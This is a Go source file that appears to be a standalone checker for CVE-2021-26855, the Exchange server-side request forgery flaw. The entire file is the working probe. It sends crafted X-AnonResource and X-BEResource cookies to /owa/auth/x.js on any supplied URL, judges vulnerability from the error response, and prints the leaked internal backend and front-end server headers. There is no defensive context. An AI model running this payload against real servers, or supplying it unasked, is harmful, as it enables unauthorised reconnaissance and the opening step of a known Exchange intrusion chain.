package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("Usage: ./cve_2021_26855 url")
	targeturl := os.Args[1]
	client := &http.Client{}

	req, err := http.NewRequest("GET", targeturl+"/owa/auth/x.js", nil)
	if err != nil {
		panic(err)
	}

	req.Header.Set("Cookie", "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if resp.StatusCode == 500 && strings.Contains(string(body), "NegotiateSecurityContext") {
		fmt.Println("[+] The target might vulnerable")
		fmt.Println("X-CalculatedBETarget:", resp.Header.Get("X-CalculatedBETarget"))
		fmt.Println("X-FEServer:", resp.Header.Get("X-FEServer"))
	} else {
		fmt.Println("[-] The target is not vulnerable.")
	}
}
